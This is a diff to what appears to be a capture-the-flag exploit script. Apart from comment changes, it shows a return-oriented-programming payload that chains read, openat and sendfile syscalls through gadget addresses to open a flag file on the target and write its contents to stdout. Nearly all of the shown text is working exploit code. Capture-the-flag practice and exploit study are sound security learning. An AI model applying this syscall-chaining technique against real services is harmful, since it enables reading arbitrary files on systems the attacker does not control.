@@ -46,7 +46,7 @@ payload += p64(pop_rax_ret)
 payload += p64(read_n)
 payload += p64(syscall_ret) # read
 
-# second payload to open using sendfile
+# second payload to open the flag using openat
 payload += p64(pop_rdi_ret)
 payload += p64(0) # arg1 (doesn't matter)
 payload += p64(pop_rsi_ret) 
@@ -57,8 +57,9 @@ payload += p64(pop_rax_ret)
 payload += p64(openat_n)
 payload += p64(syscall_ret) # openat
 
-flag_fd = 3 # fd will always be 3
+flag_fd = 3 # new fd of the flag will always be 3
 
+# third payload to write flag to stdout using sendfile
 payload += p64(pop_rdi_ret)
 payload += p64(1) # arg1 dst fd: stdout
 payload += p64(pop_rsi_ret)
@@ -69,7 +70,7 @@ payload += p64(pop_r10_ret)
 payload += p64(0xffff) # arg4 count
 payload += p64(pop_rax_ret)
 payload += p64(sendfile_n)
-payload += p64(syscall_ret)
+payload += p64(syscall_ret) # sendfile
 
 p.sendline(payload)
 p.sendline(path_str)
